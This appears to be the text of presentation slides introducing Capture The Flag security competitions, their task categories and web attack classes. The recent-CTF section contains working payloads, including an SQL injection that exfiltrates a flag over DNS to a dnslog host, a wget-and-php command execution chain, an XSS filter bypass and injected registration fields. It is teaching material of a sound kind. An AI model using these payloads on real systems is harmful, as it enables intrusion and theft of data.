CTF and Real World
D3AdCa7 deadcat6464@gmail.com

About Me
 A.K.A D3AdCa7 / ADoG  blue-lotus  /  CTF  DEFCON CTF FINALS   Web  

"Vulnerability and the way you think."
­what will u learn from CTF

"What is CTF "
­^&@!#)!@#$%^&*(&^$

Capture The Flag
Capture the Flag (CTF) is a special kind of information security competitions.
Jeopardy Attack-Defence mixed

Jeopardy
Web, Forensic, Crypto, Binary or something else

Attack-Defence
everybody knows about DEF CON CTF - something like a World Cup of all other competitions.

DefCON CTF Finals
Here every team has own network(or only one
host) with vulnarable services. Your team has time for patching your
services and developing exploits usually. So, then organizers
connects participants of competition and the
wargame starts! You should protect own services for defence points and hack
opponents for attack points.

Mixed
task-based elements It may be something like wargame with special time for

CTF in China
HDUCTF/XDCTF ISG SycloverCTF 360/Alibaba BCTF/XCTF ...

CTF in China
pentest web HoB
Hole of Brain Getting Better

CTF outside China
DefCON CTF Codegate CTF PHD CTF PlaidCTF
CGC
...

"Skill and Skill"
­How to Win

Binary Web Crypto Forensic Stego Networking

Binary
Reverse Engineering x86,ARM,MIPS... win32,Android,Linux...
Pwn Find Vulnerability Exploit!!!

Crypto
Padding Oracle Hash Length Extension Attack so much about RSA self designed broken crypto system...

Forensic
Magic header File Layout File System Figure out what is behind a lot of 0101010110101011101101010...

Stego/Hidden text in Image
File Signature cat a.bmp a.zip > b.bmp add some import part(file header ,etc.)
LSB CRC trick diff,xor

Networking
PCAP wireshark/tshark recover file recover password find the small but useful information

"Where is Web?"
­Here we go

Web and Penetration

File Include Command Injection

XXE HTTP Response Splitting

SQLi

XSS

Info Leak

CSRF

Directory traversal

Code Injection Authentication

Web and Penetration

File Upload

Padding Oracle

NPRC RCE

HeartBleed

UXSS

XXE

ShellShock JSONP Hijacking

File Include

HTTP Response Splitting

ThinkPHP RCE

SQLi Session Hijacking

Command Injection

DNS Hijacking

XSS

FastCGI RCE
Info Leak

Struts2 OGNL RCE
CSRF Length Extension Attack Directory Traversal

Code Injection PHP Memory UAF Authentication
exp for old Discuz, dedecms, etc.

"diabolic tricks and wicked craft"
­

"Let's start from some interesting case"
­from recent CTF

GCTF
SQLi get data from DNS info
http://m37gvj32.guetsec.com:9999/ index.php?id=1 union select * from dblink(%27host=%27||encode((select flag::bytea from web100 limit 1), %27hex %27)||%27.ff46cb.dnslog.info user=someuser dbname=somedb%27, %27select version%27) returns (result text);

GCTF
tricky way to exec commands tar -I filename=tar -I xxx

GCTF
XSS bypass Chrome XSS filter
%3Cscript%3Ealert(1)%2550%3Cscript %3C/script%3E

ISG
PHP is the best programming language in this universe
md5('240610708') == md5(`QNKCDZO')
this is truuuuuuue

ISG
PHP is the best programming language in this universe
user[4294967296]=admin means user[0]=admin in $_REQUEST
5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 5.6.10, 7.0.0alpha1

ISG
upload file named with username SQLi in register process how to solve?
username=1&password=1&email=sasad@qq.com','1 27.0.0.1'), ('aaa.php','f5de0b92fcff5f1fa67c503c04008278', '6666@qq.com','127.0.0.1') %23

HITCON CTF
%0a bypass regex preg_match(`/^\w+$/'
WTF........

HITCON CTF
%0a bypass regex
preg_match(`/^\w+$/'
WTF........ · mkdir orange · cd orange · wget HEXED_IP · tar cvf payload orange · php payload

HITCON CTF

%0a bypass regex preg_match(`/^\w+$/'
WTF........
wget HEX_IP 302 -> FTP protocol

twistd telnet ... busybox ftpget ...

HITCON CTF
SSRF location
Some RU gays really good at SSRF
https://github.com/ONsecLab SSRF PWNs - New Techniques and Stories.pdf

"And Real World"
­How to Win in Real Life



Business Security
Not easy as a game Not easy as a problem
Complex

Business Security
Strategy Stupid programmer
http://xxx.com/?r=select user from xx&name= Admin panel without Auth

Pentesting
100% high risk vuln

Binary
geekpwn 320,000 RMB dump firmware find vuln writing exp

Question?

